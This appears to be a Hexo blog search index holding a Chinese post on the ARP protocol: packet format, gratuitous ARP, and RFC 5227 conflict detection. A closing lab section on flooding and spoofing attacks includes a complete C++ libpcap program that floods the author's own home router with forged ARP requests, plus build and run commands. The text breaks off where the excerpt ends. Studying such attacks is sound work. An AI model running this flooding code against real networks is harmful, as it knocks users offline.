<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ARP协议及内网攻击实践</title>
      <link href="/2023/08/21/N01_apr/"/>
      <url>/2023/08/21/N01_apr/</url>
      
        <content type="html"><![CDATA[<blockquote><p>​ARP（Address Resolution Protocol，地址解析协议），是一种将IP地址和以太网MAC地址（物理地址）连接起来的协议。在<strong>局域网</strong>中，当主机或其他网络设备有数据要发送给另一个主机或设备时，仅仅知道对方的IP地址是不够的，因为IP数据报文必须封装成帧才能通过物理链路发送。因此发送方还需要有下一跳的物理MAC地址，也就需要一个从IP地址到物理地址的映射。</p></blockquote><h2 id="ARP报文格式"><a href="#ARP报文格式" class="headerlink" title="ARP报文格式"></a>ARP报文格式</h2><p>​在TCP&#x2F;IP模型中，ARP协议属于网络层，在OSI模型中ARP协议属于链路层，从功能来看，它则是连接IP地址和MAC地址的桥梁，并在局域网的路由过程中起到了至关重要的作用。无论是主机或是交换机内部都有一张ARP缓存表，记录着邻居主机或网关的IP地址及MAC地址的映射，ARP表分为动态ARP表项和静态ARP表项，静态表项通过手动配置更新，而动态表项通过自学习更新，并设有老化时间（RFC1122中规定一般20分钟）。以下是动态ARP自学习的大致流程：</p><ol><li>若主机A想向主机B发送数据包Package，A首先会查看自己的ARP缓存表，确定是否包含有主机B的IP地址及对应的MAC地址表项。</li><li>若有，则主机A直接利用ARP表中的MAC地址对IP数据报进行帧封装，并将数据报发送给主机B；若没有，则A会以广播方式发送一个ARP请求报文，该报文会被局域网内所有主机收到。若某主机发现该ARP请求报文是查询自己的MAC地址，则会以单播方式向主机A回应一个ARP响应报文，应答报文中就包含了自己的MAC地址。如果发现不是自己的，就忽略并丢弃该报文。</li><li>而主机A在收到来自目标主机B的ARP响应报文后，会将B的MAC地址加入到自己的ARP缓存表中方便下次直接使用，然后填充数据包Package并发送出去。</li></ol><blockquote><p>值得注意的是，若主机B位于局域网内，则主机A会按上述流程广播请求B的MAC地址；但假若主机B位于该局域网外，则A需要查询的则是网关的MAC地址而不是B的MAC地址，因为Package的下一跳是网关。</p></blockquote><p><img src="https://s2.loli.net/2023/08/20/DbF1nzhfpC3H4eB.jpg" alt="networks.jpg"></p><p>​ARP的报文长度28个字节，包含8个字节的报头以及20个字节的地址四元组。如下图所示：</p><p><img src="https://s2.loli.net/2023/08/20/buwDEK6eIMGR9lU.png" alt="image.png"></p><ul><li>硬件类型：通常取1，表示以太网络。（也有其他的例如IEEE 802网络：6，ATM网络：37，等）</li><li>上层协议类型：通常是IPv4，值为0x0800</li><li>硬件地址长度：以太网中为6（字节）</li><li>协议长度：IPv4长度为4（字节）</li><li>操作码（Opcode）类型：ARP 请求为 1，ARP 响应为 2，RARP 请求为 3，RARP 响应为 4（RARP：反向地址转换协议，允许局域网的物理机器从网关服务器的 ARP 表或者缓存上请求其 IP 地址）。</li></ul><p>​ARP是个独立的三层协议，不需要IP协议封装。在第二层数据链路层封装的过程中，会在ARP报文的前面加上14字节的以太网帧头，以及若干字节的PAD填充和4字节的冗余校验码（FCS）结尾。以太网中最小帧长度为64字节，若不足64字节则PAD字段会以0填充，而校验码则用于检验数据传输是否出现损坏。</p><p><img src="https://s2.loli.net/2023/08/20/hziDHbg1VdJOpSv.jpg" alt="arp帧.jpg"></p><p>​我们通过wireshark抓包也可以很清晰地看到整个ARP报文的格式：（省略了帧尾的PAD和FCS字段）<img src="https://s2.loli.net/2023/08/20/Yj6ndSoOKpPcxJF.png" alt="image.png"></p><p>​我们前面提到，ARP操作码里，1表示请求报文，2表示响应报文。通常ARP的请求报文是广播请求（因为不知道该IP对应哪台设备，因此需要在局域网内广播），而响应是单播响应。广播请求的ARP帧目的地址会被填充成<strong>FF-FF-FF-FF-FF-FF</strong>，并且在ARP报文里的Target MAC address会置为0，如下图一所示。而响应报文里的Sender MAC address则说明了被查询主机的MAC地址，如图二所示。<img src="https://s2.loli.net/2023/08/20/gDHSh2Aclkfu3Vt.png" alt="image.png"><img src="https://s2.loli.net/2023/08/20/8qwXEFLUKypngS7.png" alt="image.png"></p><p>​除此之外，还有一种比较特殊的报文：Gratuitous ARP，它属于广播请求报文的范畴，而特殊性在于它的Sender MAC address等于Target MAC address，如下图所示，它可能有以下一些作用：</p><ul><li>该类型报文起到一个宣告作用。它以广播的形式将该数据包昭告大家，不需要得到回应，只为了告诉局域网内其他计算机自己的 IP 地址和 MAC 地址。</li><li>可用于检测 IP 地址冲突。当一台主机发送了Gratuitous ARP 请求报文后，如果收到了 ARP 响应报文，则说明网络内已经存在使用该 IP 地址的主机。</li><li>可用于更新其他主机的 ARP 缓存表。如果该主机更换了网卡，而其他主机的 ARP 缓存表仍然保留着原来的 MAC 地址。这时，可以发送Gratuitous ARP 数据包。其他主机收到该数据包后，将更新 ARP 缓存表，将原来的 MAC 地址替换为新的 MAC 地址。</li></ul><p><img src="https://s2.loli.net/2023/08/20/4UrgdEsVyIntBzc.png" alt="Gratuitous ARP.png"></p><p>​尽管Gratuitous ARP可用于检测地址冲突，但规范并没有给出相应手段去解决冲突，为此，2008年发行的RFC5227提出了一个机制：ACD（Address Conflict Detection，地址冲突检测）。这里提出两种比较特殊的ARP请求报文：ARP probe以及ARP announcement，同样的，它们都属于广播请求报文，即Opcode均为1。</p><p>​ARP probe 主要用于网卡刚上线时检测某个IP地址是否有设备占用。它有一个自己想要占用的候选IP地址，并放在ARP包的Target IP address里，而 Sender IP address会填充为0，这是是为了避免对其他主机的ARP cache造成污染（因为可能已经有主机正在使用该候选IP地址了；</p><p>​而 ARP announcement 则用于在选定某个IP地址后，昭示整个局域网（LAN）：本机要使用该IP地址了。它的Sender IP address 等于Target IP address（也就是说结构和Gratuitous ARP一样）。</p><p>​ACD（Address Conflict Detection，地址冲突检测）的具体流程如下。</p><ol><li>当网卡启动时（或者从睡眠状态恢复，或者链接建立时）会发送一个ARP probe。（为了避免多个网卡同时启动同时发ARP probe造成拥塞，有一个拥塞避免策略，不会立刻发送ARP probe，单个网卡的多个probe也不会连续发送，会有间隔时间）。</li><li>发送主机可能收到ARP reply或者ARP probe，如果收到了ARP reply，说明该候选IP地址已经有主机在用了。如果收到了一个Target IP地址为候选IP的 ARP probe，说明另外一个主机也同时想要使用该候选IP地址。这种情况下，两个主机都会提醒用户出现了IP地址冲突。然后进行地址冲突处理。</li><li>如果上述两种ARP包都没有收到，说明候选IP地址可用。主机发送一个ARP announcement，告诉其他主机该候选IP本人占用，而这个ARP request会让LAN中其他主机更新自身的ARP cache。</li></ol><p>​地址冲突处理：《RFC5227》提供了三种可选的解决机制：1）放弃使用该IP地址。2）发送一个ARP announcement来进行IP地址“守卫”，如果冲突仍然继续存在，放弃使用这个IP。3）无视冲突，继续使用这个IP。</p><p>​当然，对于目前常见的通过DHCP动态获得IP地址的主机来说，通常并不需要在网卡启动时执行ACD过程。在某些手动静态配置IP或特殊网络配置中设备才有可能会使用ACD机制来避免相关冲突。以下是摘自RFC5227对于ACD提出背景的段落，感兴趣的同学可以点击原文了解 -&gt; <a href="https://www.rfc-editor.org/rfc/rfc5227">RFC 5227: IPv4 Address Conflict Detection (rfc-editor.org)</a> 或 <a href="https://rfc2cn.com/rfc5227.html">RFC5227: IPv4地址冲突检测 中文版</a>。</p><p>​Historically, accidentally configuring two Internet hosts with the same IP address has often been an annoying and hard-to-diagnose problem.</p><p>​This is unfortunate, because the existing Address Resolution Protocol (ARP) provides an easy way for a host to detect this kind of misconfiguration and report it to the user.  The DHCP specification [RFC2131] briefly mentions the role of ARP in detecting misconfiguration, as illustrated in the following three excerpts from RFC 2131:</p><ul><li>the client SHOULD probe the newly received address, e.g., with ARP</li><li>The client SHOULD perform a final check on the parameters (e.g., ARP for allocated network address)</li><li>If the client detects that the address is already in use (e.g., through the use of ARP), the client MUST send a DHCPDECLINE message to the server</li></ul><p>​Unfortunately, the DHCP specification does not give any guidance to implementers concerning the number of ARP packets to send, the interval between packets, the total time to wait before concluding that an address may safely be used, or indeed even which kinds of packets a host should be listening for, in order to make this determination. It leaves unspecified the action a host should take if, after concluding that an address may safely be used, it subsequently discovers that it was wrong. It also fails to specify what precautions a DHCP client should take to guard against pathological failure cases, such as a DHCP server that repeatedly OFFERs the same address, even though it has been DECLINEd multiple times.</p><p>​The authors of the DHCP specification may have been justified in thinking at the time that the answers to these questions seemed too simple, obvious, and straightforward to be worth mentioning, but unfortunately this left some of the burden of protocol design to each individual implementer. This document seeks to remedy this omission by clearly specifying the required actions.</p><h2 id="ARP内网攻击实践"><a href="#ARP内网攻击实践" class="headerlink" title="ARP内网攻击实践"></a>ARP内网攻击实践</h2><p>​ARP是建立在网络中各个主机互相信任的基础上的，它的诞生使得网络能够更加高效的运行，但也正因此所以存在安全缺陷。ARP协议无状态，只要某主机收到ARP响应包则会更新自己的ARP缓存表，而非只在自己发送过ARP请求才接收ARP应答。因此，攻击源可以主动伪造ARP响应包，并向局域网中其他设备或网关发送虚假的ARP信息，达到攻击的目的。</p><p><strong>「ARP攻击类型」</strong></p><ul><li><strong>ARP泛洪</strong>：攻击者向网关发送大量ARP包时造成网关cpu，内存压力增大，难以处理正常请求而导致整个网络拥塞甚至瘫痪。</li><li><strong>中间人攻击</strong>：当攻击者伪造一个这样的ARP响应包：记录着真实网关IP和虚假的MAC地址，并向局域网内目标设备不断发送，这会造成该设备内ARP缓存的网关MAC地址被篡改，从而使得其发出的数据包被重定向到虚假MAC地址上。如果该MAC是不存在的地址，会造成目标设备断网；而如果该MAC是攻击者的MAC地址，那么目标设备会将本来发送给网关的数据包发送给攻击者，这样则会造成数据被攻击者监听。</li></ul><p>​接下来我们实践模拟一下ARP泛洪以及断网攻击。如果有安装Linux Kali发行版，可以利用其内置的 nmap、arpspoo 等渗透测试工具实现。当然也可以选择自己写ARP包进行攻击，我在这里就直接用C++写了，攻击目标是我自家的路由器和几台连接的手机平板设备。准备工具：Linux虚拟机，wireshark用于抓包分析。以下是整个流程的基本思路：</p><blockquote><p>注意：请勿将网络攻击非法用于公共网络等设施。</p></blockquote><ol><li>首先需要查明自身设备的以及网关的IP和MAC地址等基本信息。</li><li>直接向网关发送大量ARP request包造成网络拥塞（ARP泛洪）。</li><li>构造ARP request包扫描整个网络连接的设备，通过wireshark查看reply并记录下它们的IP及MAC地址。</li><li>构造伪造的ARP reply包向网络中存在的设备发起攻击（中间人攻击）。</li></ol><h3 id="（一）准备设备"><a href="#（一）准备设备" class="headerlink" title="（一）准备设备"></a>（一）准备设备</h3><p>​自己在vmware安装的Linux虚拟机网络连接默认应该是NAT模式，通过IP地址和抓包也可以很容易分析出来。我家路由器网关IP为192.168.31.1，物理机为192.168.31.47，而虚拟机Linux却是192.168.80.30，虚拟机向网关的数据包会经过物理机一层转换，因此我们需要首先把虚拟机的网络连接调整为桥接模式。虚拟机有以下三种网络模式：</p><p><strong>「虚拟机三种网络模式区别」</strong></p><ul><li><strong>NAT模式</strong>：宿主机通过NAT建立一层子网，宿主机则是该子网的网关，而<strong>虚拟机需访问互联网则要通过宿主机这个网关转发出去</strong>，从网络拓扑结构来看虚拟机网卡和宿主机网卡不在同一层次网络中。</li><li><strong>桥接模式</strong>：指宿主机物理网卡和虚拟网卡通过vmnet虚换交换机进行桥接，<strong>虚权网卡和物理网卡在网络拓扑图上处于同一网络，具有同等地位</strong>，因此虚拟机直接与路由器网关通信。由于我们需要攻击路由器网关以及网络内的其他设备，因此需要让虚拟机与其位于同一网络中，故选用桥接模式。</li><li><strong>Host-only模式</strong>：该模式下虚拟网络是一个全封闭的网络，它唯一能够访问的就是宿主机。Host-Only网络和NAT网络比较相似，不同的地方在于<strong>Host-Only网络没有NAT服务，所以虚拟网络不能连接到Internet</strong>。它的宗旨就是建立一个与外界隔绝的内部网络，来提高内网的安全性。</li></ul><p>​NAT改桥接模式的细节这里就不过多介绍了，网络上有很多相关的文章。注意，IP地址需要手动设置，但不要和该网络内已被占用的IP冲突了，DNS不设置也没问题，我们实验不需要用到域名解析，当然如果你想让你的虚拟机能通过域名上网还是可以设置一下（可以设置成与物理机相同的DNS域名服务器）。修改完毕后这几个页面大概长这样：<img src="https://s2.loli.net/2023/08/22/ZSxzP2vkYdcJ34y.png" alt="image.png"></p><h3 id="ARP泛洪攻击"><a href="#ARP泛洪攻击" class="headerlink" title="ARP泛洪攻击"></a>ARP泛洪攻击</h3><p>​攻击代码使用C++完成，代码本身比较简单，只需要先定义好ARP结构体，然后根据ARP报文格式进行依次填充即可，最后再利用相关网络包发送的 pcap API 即可实现流程。对比前文提到的ARP帧格式，结构体如下，包含以太网帧头和ARP报文（不包含帧尾PAD和FCS）：<img src="https://s2.loli.net/2023/08/22/VdTrXESG5iKJqkZ.png" alt="image.png"></p><p>​总体代码如下所示，编译命令记得加 pacp 的动态链接：<code> g++ arp_req.cpp -lpcap</code>，运行命令需要管理员权限 <code> sudo ./a.out</code>，运行时需要选择虚拟机网卡，我这里是 ens33，可以通过 <code>ifconfig</code> 命令查看。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pcap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push) <span class="comment">// 保持对齐方式</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(1)    <span class="comment">// 设定1位对齐</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 攻击者ip及mac地址</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *srcip = <span class="string">&quot;192.168.31.51&quot;</span>;</span><br><span class="line">u_char SRC_MAC[<span class="number">6</span>] = &#123;<span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x29</span>, <span class="number">0x3B</span>, <span class="number">0xBB</span>, <span class="number">0x33</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 广播mac填充地址</span></span><br><span class="line">u_char BROADCAST_MAC[<span class="number">6</span>] = &#123;<span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标设备ip及缺省mac地址</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *victim_ip = <span class="string">&quot;192.168.31.1&quot;</span>;</span><br><span class="line">u_char VICTIM_MAC[<span class="number">6</span>] = &#123;<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_eth_header</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> dst_mac[<span class="number">6</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> src_mac[<span class="number">6</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> type;</span><br><span class="line">&#125; ETH_HEADER;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_arp_header</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> hardware_type;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> protocol_type;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> hardware_len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> protocol_len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> option;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> src_mac[<span class="number">6</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> src_ip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> dst_mac[<span class="number">6</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> dst_ip;</span><br><span class="line">&#125; ARP_HEADER;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_arp_packet</span></span><br><span class="line">&#123;</span><br><span class="line">    ETH_HEADER eth_header;</span><br><span class="line">    ARP_HEADER arp_header;</span><br><span class="line">&#125; ARP_PACKET;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitARPHeader</span><span class="params">(u_char *tmpBuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ARP_HEADER arp_header;</span><br><span class="line">    <span class="type">int</span> arpsize = <span class="built_in">sizeof</span>(ARP_HEADER);</span><br><span class="line"></span><br><span class="line">    arp_header.hardware_type = <span class="built_in">htons</span>(<span class="number">0x0001</span>);</span><br><span class="line">    arp_header.protocol_type = <span class="built_in">htons</span>(<span class="number">0x0800</span>);</span><br><span class="line">    arp_header.hardware_len = <span class="number">6</span>;</span><br><span class="line">    arp_header.protocol_len = <span class="number">4</span>;</span><br><span class="line">    arp_header.option = <span class="built_in">htons</span>(<span class="number">0x0001</span>); <span class="comment">// arp request</span></span><br><span class="line"></span><br><span class="line">    arp_header.src_ip = <span class="built_in">inet_addr</span>(srcip);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">        arp_header.src_mac[i] = SRC_MAC[i];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// string ret = victim_ip + to_string(num);</span></span><br><span class="line">    <span class="comment">// arp_header.dst_ip = inet_addr(ret.c_str());</span></span><br><span class="line">    arp_header.dst_ip = <span class="built_in">inet_addr</span>(victim_ip);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">        arp_header.dst_mac[i] = VICTIM_MAC[i];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">0</span>, &amp;arp_header.hardware_type, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">2</span>, &amp;arp_header.protocol_type, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">4</span>, &amp;arp_header.hardware_len, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">5</span>, &amp;arp_header.protocol_len, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">6</span>, &amp;arp_header.option, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">8</span>, &amp;arp_header.src_mac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">14</span>, &amp;arp_header.src_ip, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">18</span>, &amp;arp_header.dst_mac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">24</span>, &amp;arp_header.dst_ip, <span class="number">4</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">pcap_t</span> *fp;</span><br><span class="line">    <span class="type">char</span> errbuf[PCAP_ERRBUF_SIZE];</span><br><span class="line">    u_char packet[<span class="number">42</span>];</span><br><span class="line">    <span class="type">pcap_if_t</span> *alldevs;</span><br><span class="line">    <span class="type">pcap_if_t</span> *d;</span><br><span class="line">    <span class="type">int</span> inum;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检测网卡 */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pcap_findalldevs</span>(&amp;alldevs, errbuf) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Error in pcap_findalldevs: %s\n&quot;</span>, errbuf);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 打印网卡 */</span></span><br><span class="line">    <span class="keyword">for</span> (d = alldevs; d; d = d-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d. %s&quot;</span>, ++i, d-&gt;name);</span><br><span class="line">        <span class="keyword">if</span> (d-&gt;description)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; (%s)\n&quot;</span>, d-&gt;description);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; (No description available)\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nNo interfaces found! Make sure WinPcap is installed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter the interface number (1-%d):&quot;</span>, i);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;inum);</span><br><span class="line">    <span class="keyword">if</span> (inum &lt; <span class="number">1</span> || inum &gt; i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nInterface number out of range.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">pcap_freealldevs</span>(alldevs);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 选择 */</span></span><br><span class="line">    <span class="keyword">for</span> (d = alldevs, i = <span class="number">0</span>; i &lt; inum - <span class="number">1</span>; d = d-&gt;next, i++)</span><br><span class="line">        ;</span><br><span class="line">    <span class="comment">/* 打开输出设备 */</span></span><br><span class="line">    <span class="keyword">if</span> ((fp = <span class="built_in">pcap_open_live</span>(d-&gt;name, <span class="comment">// name of the device</span></span><br><span class="line">                             <span class="number">65535</span>,   <span class="comment">// portion of the packet to capture.</span></span><br><span class="line">                             <span class="comment">// 65536 grants that the whole packet will be captured on all the MACs.</span></span><br><span class="line">                             <span class="number">1</span>,     <span class="comment">// promiscuous mode (nonzero means promiscuous)</span></span><br><span class="line">                             <span class="number">0</span>,     <span class="comment">// read timeout</span></span><br><span class="line">                             errbuf <span class="comment">// error buffer</span></span><br><span class="line">                             )) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nUnable to open the adapter. %s is not supported by WinPcap\n&quot;</span>, d-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open succeed!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 把以太网头复制到缓冲区</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">        packet[i] = BROADCAST_MAC[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">6</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">        packet[i] = SRC_MAC[i - <span class="number">6</span>];</span><br><span class="line">    packet[<span class="number">12</span>] = <span class="number">0x08</span>;</span><br><span class="line">    packet[<span class="number">13</span>] = <span class="number">0x06</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">InitARPHeader</span>(packet + <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 发送数据包 */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">long</span> k = <span class="number">0</span>; k &lt; <span class="number">1000000</span>; ++k)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">pcap_sendpacket</span>(fp, (<span class="type">const</span> u_char *)&amp;packet, <span class="built_in">sizeof</span>(packet)) != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nError sending the packet: %s\n&quot;</span>, <span class="built_in">pcap_geterr</span>(fp));</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">usleep</span>(<span class="number">100</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;send succeed %lld times!\n&quot;</span>, ++count);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​当按下命令的那一刻，虚拟机以每秒上千个 ARP request packet 的速率向网关发起了泛洪攻击，如下图所示，此时能够明显感受到网络中其他手机平板设备网络出现阻塞以及中断的现象。</p><p><img src="https://s2.loli.net/2023/08/22/tErosQqWnAbI1YZ.png" alt="image.png"></p><p><img 